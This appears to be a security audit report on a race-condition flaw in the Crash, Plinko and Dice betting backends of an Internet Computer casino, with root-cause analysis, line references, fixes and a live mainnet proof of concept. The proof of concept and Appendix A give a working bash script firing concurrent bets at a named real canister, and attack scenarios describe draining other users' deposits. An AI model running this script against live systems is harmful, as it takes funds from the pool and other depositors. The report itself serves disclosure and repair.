# OpenHouse Casino - Critical Security Audit

**Document Version:** 1.0
**Audit Date:** December 11, 2025
**Auditor:** Independent Security Review
**Status:** CRITICAL VULNERABILITY CONFIRMED - ACTIVE EXPLOITATION POSSIBLE

---

## Executive Summary

A critical Time-of-Check-Time-of-Use (TOCTOU) race condition vulnerability exists in **all three** OpenHouse game backends (Crash, Plinko, Dice). This vulnerability allows attackers to place multiple bets using the same deposited funds by exploiting the asynchronous execution model of the Internet Computer.

**The vulnerability was confirmed through live testing on mainnet** on December 11, 2025, where 5 concurrent games were successfully executed with only 1 USDT of deposited funds.

### Severity: CRITICAL (CVSS 9.8)

### Affected Canisters

| Canister | Canister ID | Status |
|----------|-------------|--------|
| Crash Backend | `fws6k-tyaaa-aaaap-qqc7q-cai` | VULNERABLE |
| Plinko Backend | `weupr-2qaaa-aaaap-abl3q-cai` | VULNERABLE |
| Dice Backend | `whchi-hyaaa-aaaao-a4ruq-cai` | VULNERABLE |
| Roulette Backend | `wvrcw-3aaaa-aaaah-arm4a-cai` | NOT AUDITED |

---

## Vulnerability Details

### Root Cause

All three game backends follow an identical vulnerable pattern:

1. **Balance captured** before async operation
2. **Async VRF call** (`raw_rand().await`) suspends execution
3. **Stale balance value** used for deduction after await resumes

During the await suspension, the Internet Computer can process other messages from the same caller. Multiple concurrent game calls all capture the same balance value before any deductions occur.

### The Vulnerable Code Pattern

```rust
// STEP 1: Balance captured (BEFORE await)
let user_balance = accounting::get_balance(caller);
if user_balance < bet_amount {
    return Err("INSUFFICIENT_BALANCE".to_string());
}

// ... validation code ...

// STEP 2: Async VRF call - EXECUTION SUSPENDS HERE
let random_bytes = raw_rand().await?;

// STEP 3: Deduction uses STALE value from Step 1
let balance_after_bet = user_balance.checked_sub(bet_amount)?;  // STALE!
accounting::update_balance(caller, balance_after_bet)?;  // OVERWRITES
```

### Why `update_balance` Enables the Exploit

The `update_balance` function performs a direct overwrite, not an atomic read-modify-write:

```rust
// From accounting.rs - Line 586-588
pub fn update_balance(user: Principal, new_balance: u64) -> Result<(), String> {
    USER_BALANCES_STABLE.with(|balances| {
        balances.borrow_mut().insert(user, new_balance);  // OVERWRITES current value
    });
    Ok(())
}
```

When multiple concurrent games resume from their await points, each computes `balance_after_bet` using the same stale `user_balance` value, and each writes the same result, effectively deducting the bet only once regardless of how many games executed.

---

## Affected Code Locations

### Crash Backend (`crash_backend/src/game.rs`)

**Function: `play_crash`** (Lines 181-269)
- Balance capture: Line 183
- Await point: Line 212 (`raw_rand().await`)
- Stale deduction: Line 220

**Function: `play_crash_multi`** (Lines 271-392)
- Balance capture: Line 298
- Await point: Line 315 (`raw_rand().await`)
- Stale deduction: Line 323

### Plinko Backend (`plinko_backend/src/game.rs`)

**Function: `play_plinko`** (Lines 84-161)
- Balance capture: Line 86
- Await point: Line 104 (`raw_rand().await`)
- Stale deduction: Line 113

**Function: `play_multi_plinko`** (Lines 163-270)
- Balance capture: Line 181
- Await point: Line 199 (`raw_rand().await`)
- Stale deduction: Line 207

### Dice Backend (`dice_backend/src/game.rs`)

**Function: `play_dice`** (Lines 79-180)
- Balance capture: Line 87
- Await point: Line 127 (`generate_dice_roll_vrf().await` → calls `raw_rand().await`)
- Stale deduction: Line 131

**Function: `play_multi_dice`** (Lines 221-340)
- Balance capture: Line 221
- Await point: Line 267 (`generate_multi_dice_roll_vrf().await` → calls `raw_rand().await`)
- Stale deduction: Line 275

### Misleading Code Comments

The crash backend contains an incorrect safety comment at `game.rs:175-179`:

```rust
// RACE CONDITION SAFETY:
// IC canisters execute messages sequentially - no concurrent threads.
// The balance check → deduct → game → credit sequence has no await points
// between balance check and deduction, ensuring atomicity.
```

**This comment is factually incorrect.** There IS an await point (`raw_rand().await`) between the balance check and deduction.

---

## Proof of Concept - Live Mainnet Test

### Test Parameters
- **Date:** December 11, 2025
- **Canister:** Crash Backend (`fws6k-tyaaa-aaaap-qqc7q-cai`)
- **Network:** IC Mainnet
- **Initial Deposit:** 1 USDT (1,000,000 units)
- **Bet Amount:** 1 USDT per game
- **Target Multiplier:** 2.0x
- **Concurrent Calls:** 5

### Test Execution

```bash
# Send 5 concurrent play_crash calls
for i in 1 2 3 4 5; do
    dfx canister --network ic call fws6k-tyaaa-aaaap-qqc7q-cai \
        play_crash '(1000000 : nat64, 2.0 : float64)' &
done
wait
```

### Test Results

| Metric | Expected (No Bug) | Actual Result |
|--------|-------------------|---------------|
| Games Executed | 1 | **5** |
| Games Rejected | 4 | **0** |
| Initial Balance | 1,000,000 | 1,000,000 |
| Final Balance | 0 or 2,000,000 | **2,000,000** |

**All 5 games executed successfully with only 1 USDT deposited.**

### Detailed Game Results

```
Game 1: WON  - crash_point: 14.88x - payout: 2,000,000
Game 2: WON  - crash_point: 10.53x - payout: 2,000,000
Game 3: WON  - crash_point: 20.59x - payout: 2,000,000
Game 4: LOST - crash_point: 1.15x  - payout: 0
Game 5: LOST - crash_point: 1.38x  - payout: 0
```

### Pool Impact

```
Before Test:
  Pool Reserve: 431,182,946

After Test:
  Pool Reserve: 430,182,946
  Change: -1,000,000 (Pool lost 1 USDT)

User:
  Deposited: 1,000,000 (1 USDT)
  Final Balance: 2,000,000 (2 USDT)
  Profit: +1,000,000 (1 USDT)
```

---

## Attack Scenarios and Impact

### Scenario 1: Profit Extraction (Confirmed)

An attacker deposits X USDT and sends N concurrent bet calls. Due to the race condition, all N games execute using the same X USDT. The attacker's expected value becomes:

- **Without exploit:** EV = 0.99X (loses 1% to house edge)
- **With exploit:** EV = 0.99 × N × X (N times the normal expected value)

With N=10 concurrent bets, the attacker effectively plays with 10x leverage.

### Scenario 2: Accounting Inflation (Extreme Cases)

**All Games Lose:**
- Pool receives N × bet_amount via `settle_bet`
- But user only deposited 1 × bet_amount
- Pool reserve inflated by (N-1) × bet_amount with no real ckUSDT backing
- System becomes insolvent

**All Games Win:**
- Pool pays N × profit
- User receives accumulated payouts
- Pool reserve deflated beyond actual loss
- Liquidity providers suffer excess losses

### Scenario 3: Theft from Other Users

When accounting becomes sufficiently distorted:
1. Attacker inflates their balance through repeated exploits
2. Attacker withdraws inflated balance
3. Withdrawal draws from canister's real ckUSDT (including other users' deposits)
4. Legitimate users cannot withdraw their full balances

---

## Recommended Fixes

### Option 1: Atomic Balance Deduction (Recommended)

Create a new function that performs check-and-deduct atomically:

```rust
// Add to accounting.rs
pub fn try_deduct_balance(user: Principal, amount: u64) -> Result<u64, String> {
    if PENDING_WITHDRAWALS.with(|p| p.borrow().contains_key(&user)) {
        return Err("Withdrawal pending".to_string());
    }

    USER_BALANCES_STABLE.with(|balances| {
        let mut balances = balances.borrow_mut();
        let current = balances.get(&user).unwrap_or(0);
        if current < amount {
            return Err("INSUFFICIENT_BALANCE".to_string());
        }
        let new_balance = current - amount;
        balances.insert(user, new_balance);
        Ok(new_balance)
    })
}
```

Then in each game function, call after the await:

```rust
let random_bytes = raw_rand().await?;
let _balance_after = accounting::try_deduct_balance(caller, bet_amount)?;
```

### Option 2: Re-read Balance After Await

Minimal change - re-read and re-validate after await:

```rust
let random_bytes = raw_rand().await?;

// Re-read balance after await (don't use stale user_balance)
let current_balance = accounting::get_balance(caller);
if current_balance < bet_amount {
    return Err("INSUFFICIENT_BALANCE".to_string());
}

let balance_after_bet = current_balance.checked_sub(bet_amount)?;
accounting::update_balance(caller, balance_after_bet)?;
```

### Option 3: Per-Principal Game Lock

Add a set tracking principals with games in progress:

```rust
thread_local! {
    static ACTIVE_GAMES: RefCell<BTreeSet<Principal>> = RefCell::new(BTreeSet::new());
}

// At start of game:
if ACTIVE_GAMES.with(|g| g.borrow().contains(&caller)) {
    return Err("Game already in progress".to_string());
}
ACTIVE_GAMES.with(|g| g.borrow_mut().insert(caller));

// At end of game (success or error):
ACTIVE_GAMES.with(|g| g.borrow_mut().remove(&caller));
```

### Recommendation

**Option 1 (atomic try_deduct)** is the safest and cleanest solution:
- Single point of change in accounting.rs
- No additional state to manage
- No risk of stuck locks
- Fixes all game functions with same pattern

---

## Files Requiring Modification

| File | Functions to Fix |
|------|-----------------|
| `crash_backend/src/game.rs` | `play_crash`, `play_crash_multi` |
| `crash_backend/src/defi_accounting/accounting.rs` | Add `try_deduct_balance` |
| `plinko_backend/src/game.rs` | `play_plinko`, `play_multi_plinko` |
| `plinko_backend/src/defi_accounting/accounting.rs` | Add `try_deduct_balance` |
| `dice_backend/src/game.rs` | `play_dice`, `play_multi_dice` |
| `dice_backend/src/defi_accounting/accounting.rs` | Add `try_deduct_balance` |

---

## Immediate Actions Required

1. **URGENT: Pause all games** - Disable betting until fix is deployed
2. **Deploy fix** - Implement Option 1 across all three backends
3. **Audit historical transactions** - Search for patterns of concurrent bets from same principal
4. **Assess damages** - Calculate if any exploitation has occurred
5. **Notify liquidity providers** - If pool losses detected
6. **Remove misleading comments** - Delete incorrect "RACE CONDITION SAFETY" comments

---

## Technical Background: IC Execution Model

The Internet Computer executes canister messages sequentially within a single canister. However, when a message encounters an `await` point (such as an inter-canister call), the message is **suspended** and the canister can process other messages.

Key points:
- `raw_rand()` is an inter-canister call to the management canister
- During `raw_rand().await`, other messages (including from the same principal) can execute
- Multiple messages from the same principal can be suspended simultaneously
- There is no per-principal locking mechanism by default

This is documented behavior: https://internetcomputer.org/docs/current/concepts/canisters-code#message-execution

---

## Appendix A: Test Script

```bash
#!/bin/bash
# test_race_condition.sh - Proof of concept for TOCTOU vulnerability

CANISTER_ID="fws6k-tyaaa-aaaap-qqc7q-cai"  # Crash backend
BET_AMOUNT=1000000  # 1 USDT
TARGET=2.0
CONCURRENT=5

echo "Initial balance:"
dfx canister --network ic call $CANISTER_ID get_my_balance '()'

echo "Sending $CONCURRENT concurrent bets..."
for i in $(seq 1 $CONCURRENT); do
    dfx canister --network ic call $CANISTER_ID \
        play_crash "($BET_AMOUNT : nat64, $TARGET : float64)" &
done
wait

echo "Final balance:"
dfx canister --network ic call $CANISTER_ID get_my_balance '()'
```

---

## Appendix B: Glossary

- **TOCTOU:** Time-of-Check-Time-of-Use - a race condition where the state changes between checking a condition and using the result
- **VRF:** Verifiable Random Function - IC's cryptographic randomness source via `raw_rand()`
- **CEI Pattern:** Checks-Effects-Interactions - secure pattern where state changes occur before external calls
- **Stale Read:** Using a value captured earlier that no longer reflects current state

---

## Document History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2025-12-11 | Security Audit | Initial finding and live proof of concept |

---

## Signatures

**Finding Confirmed By:**
Live mainnet test demonstrating 5 games executed with 1 USDT balance.

**Canister States Verified:**
Pool reserve change of -1,000,000 correlates with user profit of +1,000,000.

---

*This document should be provided to all third-party security auditors and reviewed before any fix deployment.*
